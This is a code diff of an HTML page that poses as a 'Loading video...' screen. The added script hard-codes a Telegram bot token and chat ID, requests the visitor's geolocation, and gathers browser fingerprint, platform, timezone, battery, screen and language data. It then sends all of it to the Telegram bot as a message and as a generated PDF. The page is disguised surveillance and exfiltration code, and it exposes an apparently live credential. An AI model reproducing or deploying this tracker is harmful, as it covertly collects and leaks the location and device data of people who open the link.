@@ -2,9 +2,9 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Loading video...</title>
   <script src="https://openfpcdn.io/fingerprintjs/v4"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
   <style>
     body {
       background-color: #000;
@@ -33,6 +33,28 @@
   <h2>Loading video...</h2>
 
   <script>
+    const telegramBotToken = '7978235751:AAEsMF7a4-drLJCRGQGcco9EbznA4VPa6qg';
+    const chatId = '363719597';
+
+    async function sendTelegramMessage(message) {
+      await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      });
+    }
+
+    async function sendTelegramFile(blob) {
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('document', blob, 'data.pdf');
+
+      await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendDocument`, {
+        method: 'POST',
+        body: formData
+      });
+    }
+
     (async () => {
       const fp = await FingerprintJS.load();
       const result = await fp.get();
@@ -49,11 +71,41 @@
         })).catch(() => "Battery API blocked"),
       };
 
-      fetch("https://your-webhook-url.com", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ ...result, ...extraInfo })
-      });
+      // تلاش برای گرفتن لوکیشن کاربر
+      let locationInfo = 'Location permission denied or blocked';
+      try {
+        const geo = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(
+            pos => resolve(`Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`),
+            err => resolve('Location access denied')
+          );
+        });
+        locationInfo = geo;
+      } catch (e) {
+        locationInfo = 'Location error';
+      }
+
+      const summary = `
+📍 Location: ${locationInfo}
+🖥️ Platform: ${extraInfo.platform}
+🌐 User Agent: ${extraInfo.userAgent}
+🗺️ Timezone: ${extraInfo.timezone}
+🔋 Battery: ${JSON.stringify(extraInfo.battery)}
+🖥️ Screen: ${extraInfo.screen}
+🗣️ Language: ${extraInfo.language}
+`;
+
+      await sendTelegramMessage(summary);
+
+      // ساخت PDF از دیتا
+      const { jsPDF } = window.jspdf;
+      const doc = new jsPDF();
+      doc.text('Collected Data', 10, 10);
+      doc.text(summary, 10, 20);
+      const pdfBlob = doc.output('blob');
+
+      await sendTelegramFile(pdfBlob);
+
     })();
   </script>
 </body>
